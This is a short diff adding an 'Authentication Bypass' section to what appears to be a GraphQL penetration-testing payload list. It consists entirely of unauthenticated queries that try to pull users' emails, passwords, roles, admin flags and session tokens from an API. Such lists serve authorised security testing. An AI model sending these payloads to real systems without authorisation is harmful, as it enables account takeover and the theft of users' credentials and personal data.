@@ -1,0 +1,8 @@
+# ---- Authentication Bypass ----
+# Try unauthenticated:
+{"query":"{ users { id email password role } }"}
+{"query":"{ me { id email role isAdmin } }"}
+{"query":"{ admin { users { email password } } }"}
+ 
+# Without auth header:
+{"query":"{ currentUser { id email token } }"}
